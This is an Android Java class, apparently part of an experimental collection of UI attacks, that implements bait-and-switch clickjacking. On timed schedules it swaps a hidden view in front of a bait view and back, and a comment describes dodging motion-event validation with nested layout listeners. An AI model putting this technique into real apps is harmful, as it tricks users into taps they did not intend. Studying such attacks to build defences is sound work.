package com.example.evildoers.clickjacking;

import android.app.Activity;
import android.view.View;
import android.view.ViewTreeObserver;
import com.example.evildoers.EvilDoer;
import com.google.common.util.concurrent.*;

import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

/**
 * Switches one view on top of the other after a delay
 * A naive approach to this is quickly foiled by random motion event validation, but it turns out that if we attach a listener
 * which attaches a listener to layout, we can sometimes foil this. But probably not if the validation intervals are
 * sufficient. So I leave it this way for the sake of experimentation.
 */
public class BaitAndSwitchEvilDoer implements EvilDoer {

    protected int baitViewId;
    protected int switchViewId;
    protected int switchDelayInMillis;
    protected int switchBackDelayInMillis;
    protected static final ListeningScheduledExecutorService SWITCHER = MoreExecutors.listeningDecorator(Executors.newSingleThreadScheduledExecutor());

    public BaitAndSwitchEvilDoer(int baitViewId, int switchViewId, int switchDelayInMillis, int switchBackDelayInMillis) {
        this.baitViewId = baitViewId;
        this.switchViewId = switchViewId;
        this.switchDelayInMillis = switchDelayInMillis;
        this.switchBackDelayInMillis = switchBackDelayInMillis;
    }

    @Override
    public void doEvil(Activity activity) {
        View baitView = activity.findViewById(baitViewId);
        View switchView = activity.findViewById(switchViewId);
        scheduleSwitch(baitView, switchView, activity);
    }

    protected void scheduleSwitch(final View baitView, final View switchView, final Activity activity) {
        // Schedule the switch after a delay
        ListenableFuture future = SWITCHER.schedule(new Runnable() {
            @Override
            public void run() {
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        switchView.bringToFront();
                    }
                });
            }
        }, switchDelayInMillis, TimeUnit.MILLISECONDS);

        // On success, schedule a listener to schedule another switch
        Futures.addCallback(future, new FutureCallback() {
            @Override
            public void onSuccess(Object result) {
                switchView.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {
                    @Override
                    public void onGlobalLayout() {
                        switchView.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {
                            @Override
                            public void onGlobalLayout() {
                                scheduleBait(baitView, switchView, activity);
                                switchView.getViewTreeObserver().removeOnGlobalLayoutListener(this);
                            }
                        });
                        switchView.getViewTreeObserver().removeOnGlobalLayoutListener(this);
                    }
                });
            }

            @Override
            public void onFailure(Throwable t) {
                throw new RuntimeException(t);
            }
        });
    }

    protected void scheduleBait(final View baitView, final View switchView, final Activity activity) {
        // Schedule the bait after a delay
        ListenableFuture future = SWITCHER.schedule(new Runnable() {
            @Override
            public void run() {
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        baitView.bringToFront();
                    }
                });
            }
        }, switchBackDelayInMillis, TimeUnit.MILLISECONDS);

        // On success, schedule a switch
        Futures.addCallback(future, new FutureCallback() {
            @Override
            public void onSuccess(Object result) {
                scheduleSwitch(baitView, switchView, activity);
            }

            @Override
            public void onFailure(Throwable t) {
                throw new RuntimeException(t);
            }
        });
    }
}
